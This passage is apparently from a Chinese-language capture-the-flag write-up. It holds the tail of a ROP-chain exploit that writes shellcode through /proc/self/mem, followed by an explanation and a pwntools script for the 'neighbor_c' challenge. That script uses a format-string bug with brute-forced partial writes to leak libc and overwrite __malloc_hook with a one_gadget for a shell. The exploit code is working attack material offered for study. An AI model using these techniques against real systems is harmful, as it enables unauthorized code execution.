        code=k[-3]
        num=(int(k[-2].split('n')[0][1:-1]))
        left=0x100000000-num-0x1
        sla(">> ",code)
        sla(">> ",str(0x1))
        while(left>0):
            if(left0):
            if(left fd = 0
        payload += p64(pop_rdi_ret)
        payload += p64(filename_start + len(fd_name) + 1)
        payload += p64(pop_rsi_r15_ret)
        payload += p64(2)
        payload += p64(0) # rsi = r15 = 0
        payload += p64(open_at_plt) # open("/proc/self/mem", 2) -> fd = 1
        payload += p64(pops_ret)
        payload += p64(0) # rbx + 1 == rbp -> edx
        payload += p64(1) # rbp
        payload += p64(lseek_at_got) # r12 call r12 + rbx * 8
        payload += p64(0) # r13
        payload += p64(write_to) # r14 -> rsi
        payload += p64(1) # r15 (r15d) -> edi
        payload += p64(movs_call)
        payload += p64(0) # dummy
        payload += p64(0) # rbx after
        payload += p64(0) # rbp after
        payload += p64(0) # r12 after
        payload += p64(0) # r13 after
        payload += p64(0) # r14 after
        payload += p64(0) # r15 after
        payload += p64(pop_rdi_ret)
        payload += p64(filename_start + shellcode_at_num)
        payload += p64(puts_at_plt)
        payload += p64(write_to)
        p.recvuntil('size: ')
        p.sendline(str(len(payload)))
        p.send(payload)
        p.interactive()
    if __name__ == '__main__':
        main()
## neighbor_c | Pwn
题目逻辑比较简单，两次call函数，之后进行不停的fgets 0x100到stderr，然后fprintf。  
（以下为把sleep patch后的调试版本，原函数在while中，fprintf后会sleep 1秒，且在进入时会sleep3秒）  
stderr是通过参数传入的。  
所以可以往栈上已经有的位置写东西，然后由于两次call函数，所以存在多个指向栈上的指针，这样就可以通过partial
write（写一个字节的方式）来控制一个指向栈上的指针指向栈上想要改动的东西。（但由于栈最后一个字节存在变动，所以需要16次爆破）  
这样的话，就可以通过改动栈上的fileptr，使其指向stdout，从而得到leak的地址。  
得到leak的地址之后，就可以通过先改动指向栈上指针的低地址从而改动栈上任意位置的值，之后可以利用栈上被任意改动的值来做到任意写，把one
gadget写入malloc
hook，通过触发fprintf时的malloc来getshell。（但由于libc里stdout结构体位于X600，而stderr位于X520，这个X没法确定，所以需要半个字节，也就是16次爆破）  
最终我们需要16 × 16 = 256次爆破，还算是可以接受的范围，因为有sleep 3秒。  
（我的exp是一开始错误的思路，试图改写vtable来bypass
2.24的check，但是由于触发overflow需要0x2000个字节的输入，明显这题做不到，所以失败了，但是调试过程发现malloc触发了，所以直接改动了，把写vtable改成了写malloc
hook getshell的，所以比较混乱）  
（下次有爆破记得cat fla*。。搞得我爆破了好几次）
    from pwn import *
    import os
    context(os='linux', arch='amd64', log_level='debug')
    DEBUG = 0
    libc = ELF('libc.so.6')
    if DEBUG:
        #p = process('./neighbor_c', env={'LD_PRELOAD': os.getcwd() + '/libc.so.6'})
        #p = remote('localhost', 12121)
        pass
    else:
        #p = remote('neighbor.chal.ctf.westerns.tokyo', 37565)
        pass
    def main(p, base, halfbyte):
        if DEBUG:
            raw_input()
        p.recvuntil('mayor.')
        p.sendline('dtj')
        if DEBUG:
            base = int(raw_input('base number'), 16)
        value = base + 0x18
        p.sendline('%{}c%9$hhn'.format(value));
        if DEBUG:
            half_byte = int('0x{}600'.format(raw_input('stdout half byte number').strip()), 16)
        else:
            half_byte = int('0x{}600'.format(halfbyte), 16)
        p.sendline('%{}c%11$hn'.format(half_byte))
        p.sendline('anciety%lx %lx %lx %lx %lx %lx %lx')
        if DEBUG:
            p.recvuntil('anciety')
        else:
            p.recvuntil('anciety', timeout=4)
            #p.recvuntil('anciety', timeout=3)
        line = p.recvline().strip().split()
        p.info(line)
        libc_base = int(line[4], 16) - (0x7f1b5b0a6520 - 0x00007f1b5ace4000)
        p.info('get libc base %lx' % libc_base)
        stderr_struct = libc_base + libc.symbols['_IO_2_1_stderr_']
        #stderr_struct = libc_base + (0x7ffc9f055e00 - 0x00007f31f5233000)
        stderr_vtable = stderr_struct + 0xe0 - 8
        wstr_jump_table = libc_base + libc.symbols['_IO_wfile_jumps'] - 0x248
        # modify things back
        p.sendline('%{}c%9$hhn'.format(base + 0x18))
        stderr_last_two = u16(p64(libc_base + libc.symbols['_IO_2_1_stderr_'])[:2])
        p.sendline('%{}c%11$hn'.format(stderr_last_two))
        # change fp+0xe0 to one_gadget
        malloc_hook = libc_base + libc.symbols['__malloc_hook']
        newip_at = malloc_hook
        one_gadget = libc_base + 0xf24cb
        new_ip_packed = p64(newip_at)
        # points to libc value
        p.sendline('%{}c%9$hhn'.format(base))
        p.sendline('%{}c%11$hn'.format(u16(p64(newip_at)[:2])))
        '''
        # modify libc value to fp+0xe0
        x = 0
        for i in new_ip_packed[:4]:
            x += 1
            p.sendline('%{}c%11$hhn'.format(ord(i)))
            # points to next value to modify
            p.sendline('%{}c%9$hhn'.format(base + x))
        '''
        # modify fp+0xe0+8 to one_gadget now
        p.info('modify %x to %x' % (newip_at, one_gadget))
        x = 0
        for i in p64(one_gadget)[:6]:
            x += 1
            p.sendline('%{}c%5$hhn'.format(ord(i)))